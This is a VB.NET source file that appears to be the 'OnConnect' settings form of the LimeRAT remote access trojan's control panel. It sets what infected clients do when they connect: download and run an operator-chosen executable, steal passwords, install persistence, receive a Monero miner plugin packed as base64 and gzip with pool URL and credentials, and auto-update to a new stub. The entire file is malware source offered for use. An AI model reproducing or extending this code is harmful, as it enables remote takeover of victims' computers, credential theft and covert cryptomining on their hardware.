Public Class OnConnect
    Private Sub OnConnect_Load(sender As Object, e As EventArgs) Handles Me.Load
        txtPing.Text = "Ping All Clients Every : " + barPing.Value.ToString + " Second"
    End Sub

    Private Sub barPing_Scroll(sender As Object, e As ScrollEventArgs) Handles barPing.Scroll
        txtPing.Text = "Ping All Clients Every : " + barPing.Value.ToString + " Second"
        Main.PingClients.Interval = barPing.Value * 1000
    End Sub

    Private Sub chkDE_CheckedChanged(sender As Object, e As EventArgs) Handles chkDE.CheckedChanged
        If chkDE.Checked Then
            Dim o As New OpenFileDialog
            With o
                .Title = "RUN ON CONNECT"
            End With
            If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                'Dim exe As New IO.FileInfo(o.FileName)
                'Dim exesize As Long = exe.Length
                'If exesize > 530000 Then
                '    MsgBox("Max file size is 500KB")
                '    GoTo e
                'End If

                chkDE.Text = "Download and Execute : " + IO.Path.GetFileName(o.FileName)
                Main.PathEXE = o.FileName
                Main.CHK_DE = True
            Else
                Main.PathEXE = ""
                chkDE.Text = "Download and Execute"
                Main.CHK_DE = False
                Main.List_DE.Clear()
                chkDE.Checked = False
            End If
        Else
e:
            Main.PathEXE = ""
            chkDE.Text = "Download and Execute"
            Main.CHK_DE = False
            Main.List_DE.Clear()
            chkDE.Checked = False
        End If
    End Sub

    Private Sub OnConnect_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Hide()
        e.Cancel = True
    End Sub

    Private Sub chkPWD_CheckedChanged(sender As Object, e As EventArgs) Handles chkPWD.CheckedChanged
        If chkPWD.Checked Then
            Main.CHK_PWD = True

        Else
            Main.CHK_PWD = False
            Main.List_PWD.Clear()
        End If
    End Sub

    Private Sub btnUpdateStart_Click(sender As Object, e As EventArgs) Handles btnUpdateStart.Click
        Try
            Dim result As DialogResult
            result = MessageBox.Show("Do you want to update your clients with latest stub version?" & vbNewLine & vbNewLine & "This will only update the outdated clients." & vbNewLine & vbNewLine & "Latest LimeRAT stub is " + S_Settings.StubVer, "Auto-Update", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.Yes Then
                Dim o As New OpenFileDialog
                With o
                    .Filter = "*.exe (*.exe)| *.exe"
                    .InitialDirectory = Application.StartupPath
                    .Title = "Select New-Client"
                End With
                If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                    'Dim exe As New IO.FileInfo(o.FileName)
                    'Dim exesize As Long = exe.Length
                    'If exesize > 530000 Then
                    '    MsgBox("Max file size is 500KB")
                    '    Exit Sub
                    'End If

                    Main.ClientEXE = o.FileName
                    Main.AutoUpdate.Start()
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Return
        End Try
    End Sub

    Private Sub btnUpdateStop_Click(sender As Object, e As EventArgs) Handles btnUpdateStop.Click
        Try
            Main.AutoUpdate.Dispose()
        Catch ex As Exception
        End Try
    End Sub

    Private Async Sub CHKXMR_CheckedChanged(sender As Object, e As EventArgs) Handles CHKXMR.CheckedChanged
        If CHKXMR.Checked Then
            Main.CHK_MINER = True
            Dim miner As New XMR
            miner.txtCustoms.Visible = False
            miner.MetroCheckBox1.Visible = False
            miner.MetroButton2.Visible = False

            miner.ShowDialog()
            Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
            Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
            Main._MINER_SETTINGS = "IPLM" + Main.SPL + PLG + Main.SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F
        Else
            Main.CHK_MINER = False
            Main.List_MINER.Clear()
        End If


    End Sub

    Private Sub chkPers_CheckedChanged(sender As Object, e As EventArgs) Handles chkPers.CheckedChanged
        If chkPers.Checked Then
            Main.CHK_PERS = True

        Else
            Main.CHK_PERS = False
            Main.List_PERS.Clear()
        End If
    End Sub
End Class